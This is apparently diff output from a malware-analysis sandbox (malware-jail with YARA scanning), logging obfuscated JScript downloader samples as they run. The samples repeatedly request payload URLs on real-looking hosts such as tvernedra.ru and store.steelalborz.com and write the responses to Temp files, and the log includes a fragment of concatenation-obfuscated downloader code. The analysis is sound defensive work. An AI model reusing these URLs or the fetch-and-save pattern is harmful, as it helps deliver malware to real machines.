+18 May 18:42:14 - ADODB_Stream[29].position = (number) '0'
+18 May 18:42:14 - ADODB_Stream[29].Close()
+18 May 18:42:14 - >>> Silencing catch TypeError: SRCAj8[((MUz + (intermediate value)(intermediate value)(...)) + YTLi0)] is not a function
+    at NDn2 (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:495:72)
+    at LYUo (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:355:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:290:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at f (./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5670:27)
+    at ./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5679:28
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+18 May 18:42:14 - WScript.Sleep(1000)
+18 May 18:42:15 - MSXML2.XMLHTTP[15].open(GET,http://sreinvestment.com/4qe5s5b,false)
+18 May 18:42:15 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+18 May 18:42:15 - MSXML2.XMLHTTP[15].url = (string) 'http://sreinvestment.com/4qe5s5b'
+18 May 18:42:15 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+18 May 18:42:15 - MSXML2.XMLHTTP[15].send(undefined)
+18 May 18:42:15 - MSXML2.XMLHTTP[15] Intentionally returning HTTP/404
+18 May 18:42:15 - MSXML2.XMLHTTP[15].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:15 - MSXML2.XMLHTTP[15].status = (number) '404'
+18 May 18:42:15 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+18 May 18:42:15 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:15 - MSXML2.XMLHTTP[15].send(undefined) finished
+18 May 18:42:15 - MSXML2.XMLHTTP[15].readystate.get() => (number) '4'
+18 May 18:42:15 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:15 - new ADODB_Stream[30]
+18 May 18:42:15 - ADODB_Stream[30].Open()
+18 May 18:42:15 - ADODB_Stream[30].type = (number) '1'
+18 May 18:42:15 - MSXML2.XMLHTTP[15].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:15 - ADODB_Stream[30].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:15 - ADODB_Stream[30].Write(str) - 27 bytes
+18 May 18:42:15 - ADODB_Stream[30].size = (number) '27'
+18 May 18:42:15 - ADODB_Stream[30].position = (number) '0'
+18 May 18:42:15 - ADODB_Stream[30].SaveToFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH, 2)
+18 May 18:42:15 - ADODB_Stream[30].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:15 - ADODB_Stream[30].Close()
+18 May 18:42:15 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:15 - new ADODB_Stream[31]
+18 May 18:42:15 - ADODB_Stream[31].type = (number) '2'
+18 May 18:42:15 - ADODB_Stream[31].charset = (string) '437'
+18 May 18:42:15 - ADODB_Stream[31].Open()
+18 May 18:42:15 - ADODB_Stream[31].type.get() => (number) '2'
+18 May 18:42:15 - ADODB_Stream[31].charset.get() => (string) '437'
+18 May 18:42:15 - ADODB_Stream[31].charset.get() => (string) '437'
+18 May 18:42:15 - ADODB_Stream[31].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:15 - ADODB_Stream[31].charset.get() => (string) '437'
+18 May 18:42:15 - ADODB_Stream[31].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:15 - ADODB_Stream[31].LoadFromFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH) 27 bytes, encoding: 437
+18 May 18:42:15 - ADODB_Stream[31].position = (number) '0'
+18 May 18:42:15 - ADODB_Stream[31].Close()
+18 May 18:42:15 - >>> Silencing catch TypeError: SRCAj8[((MUz + (intermediate value)(intermediate value)(...)) + YTLi0)] is not a function
+    at NDn2 (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:495:72)
+    at LYUo (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:355:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:290:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at f (./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5670:27)
+    at ./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5679:28
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+18 May 18:42:15 - WScript.Sleep(1000)
+18 May 18:42:16 - MSXML2.XMLHTTP[15].open(GET,http://diablitos.no/oiyp9,false)
+18 May 18:42:16 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+18 May 18:42:16 - MSXML2.XMLHTTP[15].url = (string) 'http://diablitos.no/oiyp9'
+18 May 18:42:16 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+18 May 18:42:16 - MSXML2.XMLHTTP[15].send(undefined)
+18 May 18:42:16 - MSXML2.XMLHTTP[15] Intentionally returning HTTP/404
+18 May 18:42:16 - MSXML2.XMLHTTP[15].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:16 - MSXML2.XMLHTTP[15].status = (number) '404'
+18 May 18:42:16 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+18 May 18:42:16 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:16 - MSXML2.XMLHTTP[15].send(undefined) finished
+18 May 18:42:16 - MSXML2.XMLHTTP[15].readystate.get() => (number) '4'
+18 May 18:42:16 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:16 - new ADODB_Stream[32]
+18 May 18:42:16 - ADODB_Stream[32].Open()
+18 May 18:42:16 - ADODB_Stream[32].type = (number) '1'
+18 May 18:42:16 - MSXML2.XMLHTTP[15].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:16 - ADODB_Stream[32].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:16 - ADODB_Stream[32].Write(str) - 27 bytes
+18 May 18:42:16 - ADODB_Stream[32].size = (number) '27'
+18 May 18:42:16 - ADODB_Stream[32].position = (number) '0'
+18 May 18:42:16 - ADODB_Stream[32].SaveToFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH, 2)
+18 May 18:42:16 - ADODB_Stream[32].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:16 - ADODB_Stream[32].Close()
+18 May 18:42:16 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:16 - new ADODB_Stream[33]
+18 May 18:42:16 - ADODB_Stream[33].type = (number) '2'
+18 May 18:42:16 - ADODB_Stream[33].charset = (string) '437'
+18 May 18:42:16 - ADODB_Stream[33].Open()
+18 May 18:42:16 - ADODB_Stream[33].type.get() => (number) '2'
+18 May 18:42:16 - ADODB_Stream[33].charset.get() => (string) '437'
+18 May 18:42:16 - ADODB_Stream[33].charset.get() => (string) '437'
+18 May 18:42:16 - ADODB_Stream[33].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:16 - ADODB_Stream[33].charset.get() => (string) '437'
+18 May 18:42:16 - ADODB_Stream[33].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:16 - ADODB_Stream[33].LoadFromFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH) 27 bytes, encoding: 437
+18 May 18:42:16 - ADODB_Stream[33].position = (number) '0'
+18 May 18:42:16 - ADODB_Stream[33].Close()
+18 May 18:42:16 - >>> Silencing catch TypeError: SRCAj8[((MUz + (intermediate value)(intermediate value)(...)) + YTLi0)] is not a function
+    at NDn2 (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:495:72)
+    at LYUo (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:355:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:290:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at f (./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5670:27)
+    at ./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5679:28
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+18 May 18:42:16 - WScript.Sleep(1000)
+18 May 18:42:17 - WScript.Sleep(1000)
+18 May 18:42:18 - MSXML2.XMLHTTP[15].open(GET,http://tvernedra.ru/nyds9o,false)
+18 May 18:42:18 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+18 May 18:42:18 - MSXML2.XMLHTTP[15].url = (string) 'http://tvernedra.ru/nyds9o'
+18 May 18:42:18 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+18 May 18:42:18 - MSXML2.XMLHTTP[15].send(undefined)
+18 May 18:42:18 - MSXML2.XMLHTTP[15] Intentionally returning HTTP/404
+18 May 18:42:18 - MSXML2.XMLHTTP[15].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:18 - MSXML2.XMLHTTP[15].status = (number) '404'
+18 May 18:42:18 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+18 May 18:42:18 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:18 - MSXML2.XMLHTTP[15].send(undefined) finished
+18 May 18:42:18 - MSXML2.XMLHTTP[15].readystate.get() => (number) '4'
+18 May 18:42:18 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:18 - new ADODB_Stream[34]
+18 May 18:42:18 - ADODB_Stream[34].Open()
+18 May 18:42:18 - ADODB_Stream[34].type = (number) '1'
+18 May 18:42:18 - MSXML2.XMLHTTP[15].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:18 - ADODB_Stream[34].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:18 - ADODB_Stream[34].Write(str) - 27 bytes
+18 May 18:42:18 - ADODB_Stream[34].size = (number) '27'
+18 May 18:42:18 - ADODB_Stream[34].position = (number) '0'
+18 May 18:42:18 - ADODB_Stream[34].SaveToFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH, 2)
+18 May 18:42:18 - ADODB_Stream[34].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:18 - ADODB_Stream[34].Close()
+18 May 18:42:18 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:18 - new ADODB_Stream[35]
+18 May 18:42:18 - ADODB_Stream[35].type = (number) '2'
+18 May 18:42:18 - ADODB_Stream[35].charset = (string) '437'
+18 May 18:42:18 - ADODB_Stream[35].Open()
+18 May 18:42:18 - ADODB_Stream[35].type.get() => (number) '2'
+18 May 18:42:18 - ADODB_Stream[35].charset.get() => (string) '437'
+18 May 18:42:18 - ADODB_Stream[35].charset.get() => (string) '437'
+18 May 18:42:18 - ADODB_Stream[35].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:18 - ADODB_Stream[35].charset.get() => (string) '437'
+18 May 18:42:18 - ADODB_Stream[35].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:18 - ADODB_Stream[35].LoadFromFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH) 27 bytes, encoding: 437
+18 May 18:42:18 - ADODB_Stream[35].position = (number) '0'
+18 May 18:42:18 - ADODB_Stream[35].Close()
+18 May 18:42:18 - >>> Silencing catch TypeError: SRCAj8[((MUz + (intermediate value)(intermediate value)(...)) + YTLi0)] is not a function
+    at NDn2 (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:495:72)
+    at LYUo (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:355:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:290:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at f (./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5670:27)
+    at ./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5679:28
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+18 May 18:42:18 - WScript.Sleep(1000)
+18 May 18:42:19 - MSXML2.XMLHTTP[15].open(GET,http://sreinvestment.com/4qe5s5b,false)
+18 May 18:42:19 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+18 May 18:42:19 - MSXML2.XMLHTTP[15].url = (string) 'http://sreinvestment.com/4qe5s5b'
+18 May 18:42:19 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+18 May 18:42:19 - MSXML2.XMLHTTP[15].send(undefined)
+18 May 18:42:19 - MSXML2.XMLHTTP[15] Intentionally returning HTTP/404
+18 May 18:42:19 - MSXML2.XMLHTTP[15].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:19 - MSXML2.XMLHTTP[15].status = (number) '404'
+18 May 18:42:19 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+18 May 18:42:19 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:19 - MSXML2.XMLHTTP[15].send(undefined) finished
+18 May 18:42:19 - MSXML2.XMLHTTP[15].readystate.get() => (number) '4'
+18 May 18:42:19 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:19 - new ADODB_Stream[36]
+18 May 18:42:19 - ADODB_Stream[36].Open()
+18 May 18:42:19 - ADODB_Stream[36].type = (number) '1'
+18 May 18:42:19 - MSXML2.XMLHTTP[15].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:19 - ADODB_Stream[36].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:19 - ADODB_Stream[36].Write(str) - 27 bytes
+18 May 18:42:19 - ADODB_Stream[36].size = (number) '27'
+18 May 18:42:19 - ADODB_Stream[36].position = (number) '0'
+18 May 18:42:19 - ADODB_Stream[36].SaveToFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH, 2)
+18 May 18:42:19 - ADODB_Stream[36].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:19 - ADODB_Stream[36].Close()
+18 May 18:42:19 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:19 - new ADODB_Stream[37]
+18 May 18:42:19 - ADODB_Stream[37].type = (number) '2'
+18 May 18:42:19 - ADODB_Stream[37].charset = (string) '437'
+18 May 18:42:19 - ADODB_Stream[37].Open()
+18 May 18:42:19 - ADODB_Stream[37].type.get() => (number) '2'
+18 May 18:42:19 - ADODB_Stream[37].charset.get() => (string) '437'
+18 May 18:42:19 - ADODB_Stream[37].charset.get() => (string) '437'
+18 May 18:42:19 - ADODB_Stream[37].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:19 - ADODB_Stream[37].charset.get() => (string) '437'
+18 May 18:42:19 - ADODB_Stream[37].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:19 - ADODB_Stream[37].LoadFromFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH) 27 bytes, encoding: 437
+18 May 18:42:19 - ADODB_Stream[37].position = (number) '0'
+18 May 18:42:19 - ADODB_Stream[37].Close()
+18 May 18:42:19 - >>> Silencing catch TypeError: SRCAj8[((MUz + (intermediate value)(intermediate value)(...)) + YTLi0)] is not a function
+    at NDn2 (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:495:72)
+    at LYUo (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:355:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:290:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at f (./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5670:27)
+    at ./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5679:28
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+18 May 18:42:19 - WScript.Sleep(1000)
+18 May 18:42:20 - MSXML2.XMLHTTP[15].open(GET,http://diablitos.no/oiyp9,false)
+18 May 18:42:20 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+18 May 18:42:20 - MSXML2.XMLHTTP[15].url = (string) 'http://diablitos.no/oiyp9'
+18 May 18:42:20 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+18 May 18:42:20 - MSXML2.XMLHTTP[15].send(undefined)
+18 May 18:42:20 - MSXML2.XMLHTTP[15] Intentionally returning HTTP/404
+18 May 18:42:20 - MSXML2.XMLHTTP[15].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:20 - MSXML2.XMLHTTP[15].status = (number) '404'
+18 May 18:42:20 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+18 May 18:42:20 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:20 - MSXML2.XMLHTTP[15].send(undefined) finished
+18 May 18:42:20 - MSXML2.XMLHTTP[15].readystate.get() => (number) '4'
+18 May 18:42:20 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:20 - new ADODB_Stream[38]
+18 May 18:42:20 - ADODB_Stream[38].Open()
+18 May 18:42:20 - ADODB_Stream[38].type = (number) '1'
+18 May 18:42:20 - MSXML2.XMLHTTP[15].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:20 - ADODB_Stream[38].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:20 - ADODB_Stream[38].Write(str) - 27 bytes
+18 May 18:42:20 - ADODB_Stream[38].size = (number) '27'
+18 May 18:42:20 - ADODB_Stream[38].position = (number) '0'
+18 May 18:42:20 - ADODB_Stream[38].SaveToFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH, 2)
+18 May 18:42:20 - ADODB_Stream[38].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:20 - ADODB_Stream[38].Close()
+18 May 18:42:20 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:20 - new ADODB_Stream[39]
+18 May 18:42:20 - ADODB_Stream[39].type = (number) '2'
+18 May 18:42:20 - ADODB_Stream[39].charset = (string) '437'
+18 May 18:42:20 - ADODB_Stream[39].Open()
+18 May 18:42:20 - ADODB_Stream[39].type.get() => (number) '2'
+18 May 18:42:20 - ADODB_Stream[39].charset.get() => (string) '437'
+18 May 18:42:20 - ADODB_Stream[39].charset.get() => (string) '437'
+18 May 18:42:20 - ADODB_Stream[39].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:20 - ADODB_Stream[39].charset.get() => (string) '437'
+18 May 18:42:20 - ADODB_Stream[39].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:20 - ADODB_Stream[39].LoadFromFile(C:\Users\User\AppData\Local\Temp/QbGLebgRRtmH) 27 bytes, encoding: 437
+18 May 18:42:20 - ADODB_Stream[39].position = (number) '0'
+18 May 18:42:20 - ADODB_Stream[39].Close()
+18 May 18:42:20 - >>> Silencing catch TypeError: SRCAj8[((MUz + (intermediate value)(intermediate value)(...)) + YTLi0)] is not a function
+    at NDn2 (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:495:72)
+    at LYUo (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:355:12)
+    at eval (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:290:12)
+    at eval (<anonymous>)
+    at _ (malware-jail/env/eval.js:41:16)
+    at eval (malware-jail/env/eval.js:43:59)
+    at f (./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5670:27)
+    at ./malware/localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js:5679:28
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+18 May 18:42:20 - WScript.Sleep(1000)
+18 May 18:42:21 - Exception occured: object Error: Script execution timed out.
+    at ContextifyScript.Script.runInContext (vm.js:59:29)
+    at Object.runInContext (vm.js:120:6)
+    at run_in_ctx (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:325:16)
+    at Object.<anonymous> (/home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware-jail/jailme.js:360:20)
+    at Module._compile (module.js:652:30)
+    at Object.Module._extensions..js (module.js:663:10)
+    at Module.load (module.js:565:32)
+    at tryModuleLoad (module.js:505:12)
+    at Function.Module._load (module.js:497:3)
+    at Function.Module.runMain (module.js:693:10)
+18 May 18:42:21 - ==> Cleaning up sandbox.
+18 May 18:42:21 - ==> Script execution finished, dumping sandbox environment to a file.
+18 May 18:42:21 - The sandbox context has been  saved to: malware-jail/sandbox_dump_after.json
+18 May 18:42:21 - Saving: malware-jail/../malware/localhost_05-18_18-42-0005_40A87375/output/eval_1.js
+18 May 18:42:21 - Saving: malware-jail/../malware/localhost_05-18_18-42-0005_40A87375/output/C__Users_User_AppData_Local_Temp_QbGLebgRRtmH
+18 May 18:42:21 - Saving: malware-jail/../malware/localhost_05-18_18-42-0005_40A87375/output/urls.json
+
+[18/05 18:42:21][info]Exporting results to: /results/localhost_18-42-0005.dynamic.log
+[18/05 18:42:21][info]Exporting results to: /results/localhost_18-42-0005.static.log
+[18/05 18:42:21][info]Dynamic URLs extracted from localhost_05-18_18-42-0005_40A87375/localhost_18-42-0005.js and saved to ./malware/localhost_05-18_18-42-0005_40A87375/output/urls.json
+[18/05 18:42:21][info]Initializing YARA localhost_05-18_18-42-0005_40A87375/results/ <all files>
+[18/05 18:42:21][info]Process at 29441 | CMD: Optional[/usr/local/bin/yara -m -s -L -w -t PB_Dyn ./yararules/playbook_start.yar ./malware/localhost_05-18_18-42-0005_40A87375/results]
+[18/05 18:42:21][info]40A87375,/malware/localhost_05-18_18-42-0005_40A87375/results/ <all files> ,130,Malicious
+[18/05 18:42:21][warning]Yara Debugger is enabled, massive log flood. USE for training a playbook!
+[18/05 18:42:21][info]Default IE Selected: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+[18/05 18:42:21][info][79154849]Injecting Transaction Monitor
+[18/05 18:42:21][info](79154849)Starting job http://localhost/malware_samples/1b61339da335ef438a042667a69c2f3b.html
+[18/05 18:42:21][info](79154849)Last page Navigated to http://localhost/malware_samples/1b61339da335ef438a042667a69c2f3b.html status: 200 OK date: Sat, 18 May 2019 15:42:21 GMT
+[18/05 18:42:21][info]Found frames: 0
+[18/05 18:42:21][info]Creating virtual page file: /home/ico/Desktop/Work/WebsiteRaker-20190424T100537Z-001/WebsiteRaker/malware/localhost_05-18_18-42-0021_79154849/localhost_18-42-0021.js
+[18/05 18:42:21][info]Processing command for NodeJS in folder localhost_05-18_18-42-0021_79154849 and file localhost_18-42-0021.js
+[18/05 18:42:21][info]Process at 29476 | CMD: Optional[/usr/bin/node ./malware-jail/jailme.js --h404 -t 15000 -c ./config_localhost_05-18_18-42-0021_79154849.json ./malware/localhost_05-18_18-42-0021_79154849/localhost_18-42-0021.js]
+[18/05 18:42:22][warning]Uncaught Exception occured, scanning results might be innacurate: 
+18 May 18:42:21 - mailware-jail, a malware sandbox ver. 0.19
+18 May 18:42:21 - ------------------------
+18 May 18:42:21 - Arguments: --h404 -t 15000 -c ./config_localhost_05-18_18-42-0021_79154849.json ./malware/localhost_05-18_18-42-0021_79154849/localhost_18-42-0021.js
+18 May 18:42:21 - Sandbox environment sequence: malware-jail/env/utils.js,malware-jail/env/eval.js,malware-jail/env/function.js,malware-jail/env/wscript.js,malware-jail/env/browser.js,malware-jail/env/agents.js,malware-jail/env/other.js,malware-jail/env/console.js
+18 May 18:42:21 - Malware files: ./malware/localhost_05-18_18-42-0021_79154849/localhost_18-42-0021.js
+18 May 18:42:21 - Execution timeout set to: 15 seconds
+18 May 18:42:21 - Output file for sandbox dump: malware-jail/sandbox_dump_after.json
+18 May 18:42:21 - Output directory for generated files: malware-jail/../malware/localhost_05-18_18-42-0021_79154849/output/
+18 May 18:42:21 - Download from remote server: Return HTTP/404
+18 May 18:42:22 - ==> Preparing Sandbox environment.
+18 May 18:42:22 -  => Executing: malware-jail/env/utils.js quitely
+18 May 18:42:22 -  => Executing: malware-jail/env/eval.js quitely
+18 May 18:42:22 -  => Executing: malware-jail/env/function.js quitely
+18 May 18:42:22 -  => Executing: malware-jail/env/wscript.js quitely
+18 May 18:42:22 -  => Executing: malware-jail/env/browser.js quitely
+18 May 18:42:22 -  => Executing: malware-jail/env/agents.js quitely
+18 May 18:42:22 -  => Executing: malware-jail/env/other.js quitely
+18 May 18:42:22 -  => Executing: malware-jail/env/console.js quitely
+18 May 18:42:22 - ==> Executing malware file(s). =========================================
+18 May 18:42:22 -  => Executing: ./malware/localhost_05-18_18-42-0021_79154849/localhost_18-42-0021.js verbosely, reporting silent catches
+18 May 18:42:22 - Saving: malware-jail/../malware/localhost_05-18_18-42-0021_79154849/output/._malware_localhost_05-18_18-42-0021_79154849_localhost_18-42-0021.js
+18 May 18:42:22 - Saving: malware-jail/../malware/localhost_05-18_18-42-0021_79154849/output/tr_._malware_localhost_05-18_18-42-0021_79154849_localhost_18-42-0021.js
+18 May 18:42:22 - WScript.scriptfullname = (string) './malware/localhost_05-18_18-42-0021_79154849/localhost_18-42-0021.js'
+18 May 18:42:22 - WScript.arguments = (object) './malware/localhost_05-18_18-42-0021_79154849/localhost_18-42-0021.js,xyz'
+18 May 18:42:22 - Calling eval[1]('var randomdir = 3515 - 3514;?var arandomdir = 2;?var alatin = 2;?var ba12points = "437";??var aecuador = ["ht"+"tp:"+"//"+"st"+"or"+"e."+"ste"+"ela"+"lbo"+"rz"+".c"+"om"+"/fw"+"4i"+"3ss"+"f", "htt"+"p:"+"//f"+"in"+"a-m"+"ent"+"e."+"com"+"/ki"+"trl"+" ... (truncated)')
+18 May 18:42:22 - WScript.CreateObject(WScript.Shell)
+18 May 18:42:22 - new WScript.Shell[14]
+18 May 18:42:22 - WScript.Shell[14].ExpandEnvironmentStrings(%TEMP%/) => C:\Users\User\AppData\Local\Temp/
+18 May 18:42:22 - WScript.CreateObject(WinHttp.WinHttpRequest.5.1)
+18 May 18:42:22 - new MSXML2.XMLHTTP[15]
+18 May 18:42:22 - MSXML2.XMLHTTP[15].onreadystatechange = (undefined) 'undefined'
+18 May 18:42:22 - MSXML2.XMLHTTP[15].open(GET,http://store.steelalborz.com/fw4i3ssf,false)
+18 May 18:42:22 - MSXML2.XMLHTTP[15].method = (string) 'GET'
+18 May 18:42:22 - MSXML2.XMLHTTP[15].url = (string) 'http://store.steelalborz.com/fw4i3ssf'
+18 May 18:42:22 - MSXML2.XMLHTTP[15].async = (boolean) 'false'
+18 May 18:42:22 - MSXML2.XMLHTTP[15].send(undefined)
+18 May 18:42:22 - MSXML2.XMLHTTP[15] Intentionally returning HTTP/404
+18 May 18:42:22 - MSXML2.XMLHTTP[15].responsebody = (string) 'HTTP/404 Resource not found'
+18 May 18:42:22 - MSXML2.XMLHTTP[15].status = (number) '404'
+18 May 18:42:22 - MSXML2.XMLHTTP[15].readystate = (number) '4'
+18 May 18:42:22 - MSXML2.XMLHTTP[15].onreadystatechange.get() => (undefined) 'undefined'
+18 May 18:42:22 - MSXML2.XMLHTTP[15].send(undefined) finished
+18 May 18:42:22 - MSXML2.XMLHTTP[15].readystate.get() => (number) '4'
+18 May 18:42:22 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:22 - new ADODB_Stream[16]
+18 May 18:42:22 - ADODB_Stream[16].Open()
+18 May 18:42:22 - ADODB_Stream[16].type = (number) '1'
+18 May 18:42:22 - MSXML2.XMLHTTP[15].responsebody.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:22 - ADODB_Stream[16].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:22 - ADODB_Stream[16].Write(str) - 27 bytes
+18 May 18:42:22 - ADODB_Stream[16].size = (number) '27'
+18 May 18:42:22 - ADODB_Stream[16].position = (number) '0'
+18 May 18:42:22 - ADODB_Stream[16].SaveToFile(C:\Users\User\AppData\Local\Temp/O5Oy3QuOk39yZ, 2)
+18 May 18:42:22 - ADODB_Stream[16].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:22 - ADODB_Stream[16].Close()
+18 May 18:42:22 - WScript.CreateObject(ADODB.Stream)
+18 May 18:42:22 - new ADODB_Stream[17]
+18 May 18:42:22 - ADODB_Stream[17].type = (number) '2'
+18 May 18:42:22 - ADODB_Stream[17].charset = (string) '437'
+18 May 18:42:22 - ADODB_Stream[17].Open()
+18 May 18:42:22 - ADODB_Stream[17].type.get() => (number) '2'
+18 May 18:42:22 - ADODB_Stream[17].charset.get() => (string) '437'
+18 May 18:42:22 - ADODB_Stream[17].charset.get() => (string) '437'
+18 May 18:42:22 - ADODB_Stream[17].content = (string) 'HTTP/404 Resource not found'
+18 May 18:42:22 - ADODB_Stream[17].charset.get() => (string) '437'
+18 May 18:42:22 - ADODB_Stream[17].content.get() => (string) 'HTTP/404 Resource not found'
+18 May 18:42:22 - ADODB_Stream[17].LoadFromFile(C:\Users\User\AppData\Local\Temp/O5Oy3QuOk39yZ) 27 bytes, encoding: 437
+18 May 18:42:22 - ADODB_Stream[17].position = (number) '0'
+18 May 18:42:22 - ADODB_Stream[17].Close()
+18 May 18:42:22 - >>> Silencing catch TypeError: siedel.charCodeAt is not a function
+    at capitals (eval at _ (malware-jail/env/eval.js:41:16), <anonymous>:255:24)
